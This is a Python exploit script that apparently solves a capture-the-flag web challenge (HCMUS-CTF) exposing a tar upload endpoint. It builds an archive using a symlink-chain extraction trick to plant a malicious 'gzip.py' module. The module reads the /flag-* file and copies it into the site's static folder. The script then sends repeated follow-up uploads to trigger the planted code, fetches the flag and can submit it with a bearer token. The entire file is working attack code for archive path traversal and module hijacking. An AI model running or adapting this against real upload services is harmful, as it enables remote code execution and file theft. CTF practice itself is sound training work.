from __future__ import annotations

import argparse
import io
import json
import tarfile
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid

from harness import Member, build_archive, case_empty_name_symlink_chain


def build_stage1() -> bytes:
    payload = (
        b'import glob,pathlib\n'
        b'p=glob.glob("/flag-*")[0]\n'
        b'pathlib.Path("/app/static").mkdir(exist_ok=True)\n'
        b'pathlib.Path("/app/static/f").write_text(pathlib.Path(p).read_text())\n'
        b'raise RuntimeError\n'
    )
    members = case_empty_name_symlink_chain()[:-1] + [
        Member("file", "gzip.py", content=payload),
    ]
    return build_archive(members, mode="w:bz2")


def build_stage2() -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        info = tarfile.TarInfo("x")
        info.size = 0
        tf.addfile(info, io.BytesIO(b""))
    return buf.getvalue()


def multipart_body(filename: str, data: bytes) -> tuple[bytes, str]:
    boundary = "----CodexBoundary" + uuid.uuid4().hex
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
        "Content-Type: application/x-tar\r\n\r\n"
    ).encode()
    body += data
    body += f"\r\n--{boundary}--\r\n".encode()
    return body, boundary


def post_archive(base_url: str, archive: bytes) -> tuple[int, bytes]:
    body, boundary = multipart_body("x.tar", archive)
    req = urllib.request.Request(
        urllib.parse.urljoin(base_url.rstrip("/") + "/", "untar"),
        data=body,
        method="POST",
        headers={
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Content-Length": str(len(body)),
            "Connection": "close",
        },
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status, resp.read()
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read()


def get_flag(base_url: str) -> str | None:
    probe = urllib.parse.urljoin(
        base_url.rstrip("/") + "/",
        f"static/f?ts={time.time_ns()}",
    )
    req = urllib.request.Request(probe, headers={"Connection": "close"})
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            text = resp.read().decode(errors="replace").strip()
            if text.startswith("HCMUS-CTF{"):
                return text
    except urllib.error.HTTPError:
        return None
    return None


def submit_flag(api_base: str, chall_id: str, token: str, flag: str) -> tuple[int, str]:
    data = json.dumps({"flag": flag}).encode()
    req = urllib.request.Request(
        urllib.parse.urljoin(api_base.rstrip("/") + "/", f"api/v1/challs/{chall_id}/submit"),
        data=data,
        method="POST",
        headers={
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json",
            "Content-Length": str(len(data)),
        },
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status, resp.read().decode(errors="replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode(errors="replace")


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True, help="Challenge base URL, e.g. http://chall.blackpinker.com:20528")
    parser.add_argument("--attempts", type=int, default=24)
    parser.add_argument("--delay", type=float, default=0.15)
    parser.add_argument("--submit", action="store_true")
    parser.add_argument("--api-base", default="https://ctf.blackpinker.com/")
    parser.add_argument("--chall-id")
    parser.add_argument("--token")
    args = parser.parse_args()

    stage1 = build_stage1()
    stage2 = build_stage2()

    status, body = post_archive(args.url, stage1)
    print(f"stage1_status={status}")
    print(body.decode(errors="replace").strip())

    flag = get_flag(args.url)
    if flag:
        print(flag)
        return 0

    for attempt in range(1, args.attempts + 1):
        status, body = post_archive(args.url, stage2)
        print(f"stage2_attempt={attempt} status={status} body={body.decode(errors='replace').strip()}")
        flag = get_flag(args.url)
        if flag:
            print(flag)
            if args.submit:
                if not args.chall_id or not args.token:
                    raise SystemExit("--submit requires --chall-id and --token")
                sub_status, sub_body = submit_flag(args.api_base, args.chall_id, args.token, flag)
                print(f"submit_status={sub_status}")
                print(sub_body.strip())
            return 0
        time.sleep(args.delay)

    raise SystemExit("flag not retrieved")


if __name__ == "__main__":
    raise SystemExit(main())
